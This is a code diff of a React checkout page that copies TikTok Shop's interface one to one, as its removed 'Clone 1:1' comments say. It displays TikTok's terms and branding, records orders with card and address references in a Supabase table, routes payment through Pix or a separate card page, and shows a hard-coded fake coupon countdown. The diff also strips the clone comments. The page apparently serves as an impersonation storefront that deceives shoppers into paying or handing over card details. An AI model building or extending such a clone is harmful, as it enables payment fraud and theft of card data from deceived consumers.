@@ -14,15 +14,15 @@ import {
   Plus,
   Minus,
   Ticket,
-  CreditCard,
-  CreditCard as CardIcon,
-  CheckCircle2
+  CreditCard
 } from 'lucide-react';
 import { Product } from '@/data/products';
 import { Button } from '@/components/ui/button';
 import NoteDrawer from '@/components/NoteDrawer';
 import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
 import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';
+import { supabase } from "@/integrations/supabase/client";
+import { showError } from '@/utils/toast';
 
 const Checkout: React.FC = () => {
   const location = useLocation();
@@ -35,8 +35,10 @@ const Checkout: React.FC = () => {
   const [quantity, setQuantity] = useState(1);
   const [couponAmount, setCouponAmount] = useState(5);
   const [cardData, setCardData] = useState<any>(null);
+  const [addressData, setAddressData] = useState<any>(null);
   const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
   const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
+  const [isPlacingOrder, setIsPlacingOrder] = useState(false);
 
   useEffect(() => {
     if (location.state?.product) {
@@ -48,6 +50,10 @@ const Checkout: React.FC = () => {
     if (location.state?.cardAdded && location.state?.cardData) {
       setCardData(location.state.cardData);
       setPaymentMethod('card');
+    }
+
+    if (location.state?.addressAdded && location.state?.addressData) {
+      setAddressData(location.state.addressData);
     }
   }, [location, navigate]);
 
@@ -61,9 +67,44 @@ const Checkout: React.FC = () => {
   const finalTotal = subtotal - couponAmount;
   const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');
 
+  const handlePlaceOrder = async () => {
+    if (!addressData) {
+      showError("Por favor, adicione um endereço de entrega.");
+      navigate('/adicionar-endereco');
+      return;
+    }
+
+    setIsPlacingOrder(true);
+    try {
+      const { error } = await supabase
+        .from('orders')
+        .insert([{
+          product_title: product.title,
+          quantity,
+          total_price: finalTotalStr,
+          payment_method: paymentMethod,
+          card_id: paymentMethod === 'card' ? cardData?.id : null,
+          address_id: addressData.id,
+          order_note: orderNote
+        }]);
+
+      if (error) throw error;
+
+      if (paymentMethod === 'pix') {
+        navigate('/pix-pagamento', { state: { product } });
+      } else {
+        window.location.href = '/checkout.html';
+      }
+    } catch (err) {
+      console.error("Erro ao finalizar pedido:", err);
+      showError("Erro ao processar o pedido.");
+    } finally {
+      setIsPlacingOrder(false);
+    }
+  };
+
   return (
     <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
-      {/* Header 1:1 Clone */}
       <div className="bg-white border-b sticky top-0 z-50 flex flex-col items-center">
         <div className="w-full h-12 flex items-center px-4 relative">
           <button onClick={() => navigate(-1)} className="absolute left-2 p-2">
@@ -82,23 +123,23 @@ const Checkout: React.FC = () => {
       </div>
 
       <div className="max-w-[600px] mx-auto">
-        {/* Endereço - Topo */}
         <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
           <div className="flex items-center space-x-2">
-            <MapPin size={18} className="text-gray-900" />
-            <span className="text-[14px] text-gray-900 font-medium">Endereço de envio</span>
+            <MapPin size={18} className={addressData ? "text-[#00BFA5]" : "text-gray-900"} />
+            <span className="text-[14px] text-gray-900 font-medium">
+              {addressData ? `${addressData.address}, ${addressData.number}` : "Endereço de envio"}
+            </span>
           </div>
           <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>
-            + Adicionar endereço
+            {addressData ? "Alterar" : "+ Adicionar endereço"}
           </button>
         </div>
 
-        {/* Produto e Vendedor */}
         <div className="bg-white mt-2.5 p-4">
           <div className="flex justify-between items-center mb-3">
             <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
             <button className="text-[13px] text-gray-400 flex items-center" onClick={() => setIsNoteDrawerOpen(true)}>
-              Adicionar nota <ChevronRight size={14} className="ml-1" />
+              {orderNote ? "Nota adicionada" : "Adicionar nota"} <ChevronRight size={14} className="ml-1" />
             </button>
           </div>
           
@@ -129,11 +170,9 @@ const Checkout: React.FC = () => {
                  <div className="flex flex-col">
                    <div className="flex items-center space-x-1">
                      <span className="text-[16px] font-bold text-[#FF2C55]">R$ {unitPriceNum.toFixed(2).replace('.', ',')}</span>
-                     <Ticket size={14} className="text-[#FF2C55] fill-[#FF2C55]/20" />
                    </div>
                    <div className="flex items-center space-x-1.5">
                      <span className="text-[11px] text-gray-400 line-through">R$ {originalUnitPriceNum.toFixed(2).replace('.', ',')}</span>
-                     <span className="text-[10px] font-bold text-[#FF2C55]">-34%</span>
                    </div>
                  </div>
                  
@@ -151,11 +190,7 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Seção Cupons 1:1 */}
-        <div 
-          className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer"
-          onClick={() => setIsCouponDrawerOpen(true)}
-        >
+        <div className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
           <div className="flex items-center space-x-2">
             <Ticket size={20} className="text-[#FF2C55]" />
             <span className="text-[14px] font-bold text-gray-900">Desconto do TikTok Shop</span>
@@ -168,15 +203,10 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Resumo do Pedido - Layout Detalhado 1:1 */}
         <div className="bg-white mt-2.5 p-4">
           <h3 className="text-[15px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
-          
           <div className="space-y-4">
-            <div 
-              className="flex justify-between items-center cursor-pointer"
-              onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}
-            >
+            <div className="flex justify-between items-center cursor-pointer" onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}>
               <div className="flex items-center space-x-1.5">
                 <span className="text-[14px] text-gray-900 font-bold">Subtotal do produto</span>
                 {isSubtotalOpen ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
@@ -211,73 +241,38 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Forma de Pagamento - Clone 1:1 */}
         <div className="bg-white mt-2.5 p-4 space-y-6">
           <h3 className="text-[15px] font-bold text-gray-900">Forma de pagamento</h3>
-          
-          {/* Cartão de Crédito */}
           <div className="space-y-3">
-            <div 
-              className="flex items-center justify-between cursor-pointer"
-              onClick={() => navigate('/adicionar-cartao')}
-            >
+            <div className="flex items-center justify-between cursor-pointer" onClick={() => navigate('/adicionar-cartao')}>
               <div className="flex items-center space-x-2">
                 <div className="w-6 h-6 bg-gray-50 flex items-center justify-center border border-gray-100">
-                  <Plus size={14} className="text-gray-400" />
+                  {cardData ? <CreditCard size={14} className="text-[#00BFA5]" /> : <Plus size={14} className="text-gray-400" />}
                 </div>
-                <span className="text-[14px] font-medium text-gray-900">Cartão de crédito</span>
+                <span className="text-[14px] font-medium text-gray-900">
+                  {cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}
+                </span>
               </div>
               <ChevronRight size={18} className="text-gray-300" />
             </div>
-            
-            <div className="flex items-center space-x-2 px-8">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" />
-              <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" />
-              <img src="https://images.seeklogo.com/logo-png/20/1/elo-logo-png_seeklogo-205447.png" className="h-4" />
-              <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" className="h-4" />
-            </div>
-
-            <div className="px-8">
-              <div className="bg-[#FFF1F3] text-[#FF2C55] text-[11px] font-bold px-2 py-0.5 rounded-sm inline-flex items-center cursor-pointer">
-                Sem juros em até 3 parcelas <ChevronRight size={12} className="ml-1" />
+            <div className="flex items-center justify-between cursor-pointer border-t pt-5" onClick={() => setPaymentMethod('pix')}>
+              <div className="flex items-center space-x-3">
+                <div className="bg-[#EFFFFD] p-1.5 rounded-sm">
+                  <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
+                </div>
+                <span className="text-[14px] font-medium text-gray-900">Pix</span>
               </div>
-              <p className="text-[11px] text-gray-400 mt-1">Pague em até 12 parcelas</p>
-            </div>
-          </div>
-
-          {/* Pix */}
-          <div 
-            className="flex items-center justify-between cursor-pointer border-t pt-5"
-            onClick={() => setPaymentMethod('pix')}
-          >
-            <div className="flex items-center space-x-3">
-              <div className="bg-[#EFFFFD] p-1.5 rounded-sm">
-                <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
+              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
+                {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
               </div>
-              <span className="text-[14px] font-medium text-gray-900">Pix</span>
-            </div>
-            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
-              {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
-            </div>
-          </div>
-
-          {/* GPay / Ver Todos */}
-          <div className="flex items-center justify-between border-t pt-5">
-            <div className="h-6 px-1 border rounded flex items-center">
-              <img src="https://images.seeklogo.com/logo-png/32/1/google-pay-logo-png_seeklogo-324563.png" className="h-3" />
-            </div>
-            <div className="flex items-center text-[13px] font-bold text-gray-900 cursor-pointer">
-              Ver todos <ChevronRight size={16} className="ml-0.5" />
             </div>
           </div>
         </div>
 
-        {/* Termos Legais */}
         <div className="p-4 space-y-4">
           <p className="text-[11px] text-gray-500 leading-tight">
             Ao fazer um pedido, você concorda com <span className="font-bold text-gray-900">Termos de uso e venda do TikTok Shop</span> e reconhece que leu e concordou com a <span className="font-bold text-gray-900">Política de privacidade do TikTok</span>.
           </p>
-
           <div className="bg-[#FFF1F3] p-3.5 flex items-center space-x-2 rounded-sm border border-[#FFD9E0]/30">
             <span className="text-[16px]">😊</span>
             <span className="text-[12px] text-[#FF2C55] font-medium leading-tight">
@@ -287,7 +282,6 @@ const Checkout: React.FC = () => {
         </div>
       </div>
 
-      {/* Footer Fixo Clone 1:1 */}
       <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
         <div className="max-w-[600px] mx-auto">
           <div className="flex justify-between items-center mb-3 px-1">
@@ -296,15 +290,10 @@ const Checkout: React.FC = () => {
           </div>
           <Button 
             className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[54px] flex flex-col items-center justify-center space-y-0"
-            onClick={() => {
-              if (paymentMethod === 'pix') {
-                navigate('/pix-pagamento', { state: { product } });
-              } else {
-                window.location.href = '/checkout.html';
-              }
-            }}
+            onClick={handlePlaceOrder}
+            disabled={isPlacingOrder}
           >
-            <span className="text-[17px] mb-0.5">Fazer pedido</span>
+            <span className="text-[17px] mb-0.5">{isPlacingOrder ? "Processando..." : "Fazer pedido"}</span>
             <span className="text-[11px] font-medium opacity-90">O cupom expira em 02:43:46</span>
           </Button>
         </div>
